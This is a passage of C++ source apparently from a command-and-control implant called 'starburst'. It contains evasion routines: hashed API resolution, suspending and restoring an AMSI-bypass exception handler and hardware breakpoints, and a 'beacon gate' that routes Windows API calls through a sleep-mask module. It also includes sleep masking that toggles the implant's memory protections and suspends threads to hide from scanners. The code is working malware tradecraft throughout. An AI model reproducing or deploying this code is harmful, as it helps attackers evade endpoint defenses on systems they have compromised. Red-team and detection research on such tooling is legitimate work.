        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr7 = 0;
        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
    }

    auto pRemoveVEH = reinterpret_cast<decltype(RtlRemoveVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlRemoveVectoredExceptionHandler" ) ) );
    if ( pRemoveVEH ) pRemoveVEH( s.handle );
    inst.evasion.amsi_veh = nullptr;
}

static auto declfn sm_restore_veh( instance& inst, const sm_veh_state& s ) -> void {
    if ( !s.handle || !inst.evasion.amsi_veh_fn ) return;

    auto pAddVEH = reinterpret_cast<decltype(RtlAddVectoredExceptionHandler)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlAddVectoredExceptionHandler" ) ) );
    if ( pAddVEH )
        inst.evasion.amsi_veh = pAddVEH( 1,
            reinterpret_cast<PVECTORED_EXCEPTION_HANDLER>( inst.evasion.amsi_veh_fn ) );

    auto pNtSetCtx = reinterpret_cast<decltype(NtSetContextThread)*>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "NtSetContextThread" ) ) );
    if ( pNtSetCtx ) {
        CONTEXT ctx = {};
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        ctx.Dr0 = s.dr0; ctx.Dr1 = s.dr1; ctx.Dr7 = s.dr7;
        pNtSetCtx( reinterpret_cast<HANDLE>( static_cast<LONG_PTR>(-2) ), &ctx );
    }
}

#endif

auto declfn evasion_beacon_gate_call(
    instance& inst, void* fn_ptr, int win_api_id,
    int num_args, ULONG_PTR* args, bool mask
) -> ULONG_PTR {
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_veh_state veh_state = {};
#endif
        DWORD pre_prot = 0;
        if ( mask ) {
            inst.kernel32.VirtualProtect(
                reinterpret_cast<PVOID>( inst.base.address ),
                inst.base.length,
                PAGE_EXECUTE_READWRITE, &pre_prot );
        }

        sm_beacon_info info;
        sm_heap_record sentinel;
        build_sm_beacon_info( inst, info, sentinel );

        sm_function_call call = {};
        call.functionPtr = fn_ptr;
        call.function    = static_cast<sm_win_api>( win_api_id );
        call.numOfArgs   = num_args;
        for ( int i = 0; i < num_args && i < 10; i++ )
            call.args[i] = args[i];
        call.bMask   = mask ? TRUE : FALSE;
        call.retValue = 0;

        DWORD coff_prot = 0;
        if ( mask ) {
            inst.kernel32.VirtualProtect(
                inst.evasion.sleepmask_vs.code_base,
                inst.evasion.sleepmask_vs.code_size,
                PAGE_EXECUTE_READWRITE, &coff_prot );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
            sm_suspend_veh( inst, veh_state );
#endif
            sm_suspend_threads( inst );
        }

        auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
        fn( &info, &call );

        if ( mask ) {
            DWORD coff_restore = 0;
            inst.kernel32.VirtualProtect(
                inst.evasion.sleepmask_vs.code_base,
                inst.evasion.sleepmask_vs.code_size,
                PAGE_EXECUTE_READ, &coff_restore );
            DWORD post_prot = 0;
            inst.kernel32.VirtualProtect(
                reinterpret_cast<PVOID>( inst.base.address ),
                inst.base.length,
                PAGE_EXECUTE_READ, &post_prot );
            sm_resume_threads( inst );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
            sm_restore_veh( inst, veh_state );
#endif
        }

        return call.retValue;
    }
#endif
    (void)win_api_id; (void)mask;
    typedef ULONG_PTR (__stdcall *gate_0)();
    typedef ULONG_PTR (__stdcall *gate_1)( ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_2)( ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_3)( ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_4)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_5)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
    typedef ULONG_PTR (__stdcall *gate_6)( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );

    switch ( num_args ) {
        case 0: return reinterpret_cast<gate_0>( fn_ptr )();
        case 1: return reinterpret_cast<gate_1>( fn_ptr )( args[0] );
        case 2: return reinterpret_cast<gate_2>( fn_ptr )( args[0], args[1] );
        case 3: return reinterpret_cast<gate_3>( fn_ptr )( args[0], args[1], args[2] );
        case 4: return reinterpret_cast<gate_4>( fn_ptr )( args[0], args[1], args[2], args[3] );
        case 5: return reinterpret_cast<gate_5>( fn_ptr )( args[0], args[1], args[2], args[3], args[4] );
        case 6: return reinterpret_cast<gate_6>( fn_ptr )( args[0], args[1], args[2], args[3], args[4], args[5] );
        default: return reinterpret_cast<gate_0>( fn_ptr )();
    }
}

auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS && defined(_WIN64)
    if ( inst.evasion.sleepmask_vs.loaded && inst.evasion.sleepmask_vs.entry ) {
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_veh_state veh_state = {};
#endif
        DWORD pre_prot = 0;
        inst.kernel32.VirtualProtect(
            reinterpret_cast<PVOID>( inst.base.address ),
            inst.base.length,
            PAGE_EXECUTE_READWRITE, &pre_prot );

        sm_beacon_info info;
        sm_heap_record sentinel;
        build_sm_beacon_info( inst, info, sentinel );

        sm_function_call call = {};
        call.functionPtr = reinterpret_cast<PVOID>( inst.kernel32.WaitForSingleObject );
        call.function    = SM_WAITFORSINGLEOBJECT;
        call.numOfArgs   = 2;
        call.args[0]     = reinterpret_cast<ULONG_PTR>( (HANDLE)(LONG_PTR)-1 );
        call.args[1]     = static_cast<ULONG_PTR>( sleep_ms );
        call.bMask       = TRUE;
        call.retValue    = 0;

        DWORD coff_prot = 0;
        inst.kernel32.VirtualProtect(
            inst.evasion.sleepmask_vs.code_base,
            inst.evasion.sleepmask_vs.code_size,
            PAGE_EXECUTE_READWRITE, &coff_prot );

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_suspend_veh( inst, veh_state );
#endif
        sm_suspend_threads( inst );

        auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
        fn( &info, &call );

        DWORD coff_restore = 0;
        inst.kernel32.VirtualProtect(
            inst.evasion.sleepmask_vs.code_base,
            inst.evasion.sleepmask_vs.code_size,
            PAGE_EXECUTE_READ, &coff_restore );

        DWORD post_prot = 0;
        inst.kernel32.VirtualProtect(
            reinterpret_cast<PVOID>( inst.base.address ),
            inst.base.length,
            PAGE_EXECUTE_READ, &post_prot );

        sm_resume_threads( inst );
#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
        sm_restore_veh( inst, veh_state );
#endif

        return;
    }
#endif
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
}

} // namespace starburst
